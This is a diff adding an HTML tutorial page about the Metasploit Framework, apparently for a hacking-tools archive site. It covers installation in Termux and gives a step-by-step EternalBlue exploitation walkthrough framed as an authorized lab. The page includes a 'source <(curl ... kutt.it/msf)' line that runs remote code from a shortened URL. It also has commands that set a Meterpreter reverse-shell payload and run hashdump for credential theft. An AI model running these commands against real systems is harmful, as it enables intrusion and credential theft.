@@ -1,0 +1,53 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <title>Anonymous Archives - Metasploit Framework</title>
+  <!-- Paste the full <style> block from index.html here, including .binary-bg and animations -->
+</head>
+<body>
+  <div class="binary-bg"></div>
+  <!-- Navbar identical to previous pages, with active link highlighting if desired -->
+  <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
+    <!-- ... same as index.html ... -->
+  </nav>
+
+  <div class="container mt-4">
+    <section id="tool-metasploit">
+      <h2>Metasploit Framework</h2>
+      <p>Metasploit Framework is an open-source Ruby-based penetration testing platform that enables security professionals to develop, test, and execute exploit code against remote targets. It includes a vast database of exploits, payloads, auxiliary modules, and post-exploitation tools, making it essential for vulnerability validation and controlled testing.</p>
+      <img src="https://www.offsec.com/app/uploads/2018/05/msfu-req0.png" alt="Metasploit Console Startup" class="img-fluid">
+      <h3>Uses</h3>
+      <p>Metasploit is employed for vulnerability exploitation, payload delivery (e.g., reverse shells), post-exploitation tasks (e.g., privilege escalation, credential dumping), and auxiliary scanning. Example: Delivering a Meterpreter payload to gain interactive access on a vulnerable system during authorized penetration testing.</p>
+      <h3>Installation in Termux</h3>
+      <p>Metasploit can be installed on Termux using community scripts (ensure storage permissions and updates first). Run the following:</p>
+      <pre><code>pkg update && pkg upgrade -y
+pkg install wget curl -y
+source &lt;(curl -fsSL https://kutt.it/msf)  # Or use: wget https://raw.githubusercontent.com/gushmazuko/metasploit_in_termux/master/metasploit.sh &amp;&amp; chmod +x metasploit.sh &amp;&amp; ./metasploit.sh</code></pre>
+      <p>After installation, launch with <code>./msfconsole</code> or <code>msfconsole</code>. Common issues: Dependency errors—rerun <code>pkg install ruby postgresql</code> and initialize the database with <code>msfdb init</code>. To uninstall, remove the directory and packages.</p>
+      <h3>Functions and Walkthroughs</h3>
+      <p>Basic commands: <code>msfconsole</code> to start; <code>search eternalblue</code> to find modules; <code>use exploit/windows/smb/ms17_010_eternalblue</code> to select; <code>show options</code> to view settings; <code>set RHOSTS target_ip</code>; <code>exploit</code> to run. Meterpreter session: <code>sessions -i 1</code> for interaction.</p>
+      <img src="https://i.ytimg.com/vi/gWKyFYMY_Pk/maxresdefault.jpg" alt="Metasploit Console Basic Commands Example" class="img-fluid">
+
+      <h3>Detailed Tutorial: Basic Exploitation with Metasploit (Ethical Lab Scenario)</h3>
+      <p>This tutorial demonstrates using Metasploit to exploit a vulnerable Windows service in a controlled, authorized virtual lab (e.g., Metasploitable or a test VM). Always obtain explicit written permission before testing any non-owned system. Unauthorized use is illegal.</p>
+      <ol>
+        <li>Launch Metasploit: Open Termux or terminal and run <code>msfconsole</code>. Wait for the banner and prompt (<code>msf6 &gt;</code>).</li>
+        <li>Search for modules: Use <code>search type:exploit platform:windows smb</code> to find relevant exploits (e.g., MS17-010 EternalBlue for demonstration).</li>
+        <li>Select an exploit: <code>use exploit/windows/smb/ms17_010_eternalblue</code>.</li>
+        <li>Configure options: Run <code>show options</code>. Set required values, e.g., <code>set RHOSTS 192.168.1.100</code> (target IP), <code>set LHOST your_ip</code> (attacker IP for reverse connection), <code>set PAYLOAD windows/x64/meterpreter/reverse_tcp</code>.</li>
+        <li>Verify setup: <code>show options</code> again to confirm.</li>
+        <li>Run the exploit: Type <code>exploit</code> or <code>run</code>. If successful, a Meterpreter session opens (e.g., <code>meterpreter &gt;</code>).</li>
+        <li>Interact with session: <code>sessions -i 1</code>. Use commands like <code>sysinfo</code> (system details), <code>getuid</code> (current user), <code>shell</code> (system shell), or <code>hashdump</code> (credential extraction—ethical use only).</li>
+        <li>Clean up: <code>exit</code> from Meterpreter, then <code>exit</code> from msfconsole. Document findings responsibly.</li>
+      </ol>
+      <p>Expected output includes session creation confirmation and interactive shell access. Common issues: Firewall blocks—test connectivity first; outdated modules—update with <code>msfupdate</code>.</p>
+      <img src="https://www.varonis.com/hubfs/Imported_Blog_Media/metasploit-version.png?hsLang=en" alt="Metasploit Version and Exploit Statistics" class="img-fluid">
+      <p>For advanced study, refer to the official Metasploit Unleashed course: <a href="https://www.offsec.com/metasploit-unleashed" target="_blank">OffSec Metasploit Unleashed</a>.</p>
+    </section>
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+</body>
+</html>
